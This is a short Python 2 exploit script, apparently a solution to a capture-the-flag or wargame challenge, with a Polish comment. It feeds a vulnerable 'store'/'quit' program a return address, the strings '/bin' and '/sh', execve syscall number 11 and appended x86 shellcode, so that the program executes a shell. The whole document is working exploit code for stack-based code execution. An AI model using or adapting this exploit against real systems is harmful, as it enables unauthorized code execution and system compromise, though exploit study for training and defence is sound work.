#!/usr/bin/python2.7

SHELLCODE = "\x5e\x59\x59\x58\x56\x51\x89\xe3\x89\xf9\x89\xfa\xcd\x80"
# Jezeli jest malo miejsca na ukrycie parametrow wywolania INT 80 mozna je zapisac na stosie a pozniej zrzucac za pomoca popow

def convert_to_int_le(string):
    return str(int(string[::-1].encode('hex'), 16))


print "store"
print str(int(0xBFFFF58C))
print "109"

print "store"
print convert_to_int_le('/sh')
print "110"

print "store"
print convert_to_int_le("/bin")
print "112"

print "store"
print "11"
print "113"

print "quit" + SHELLCODE
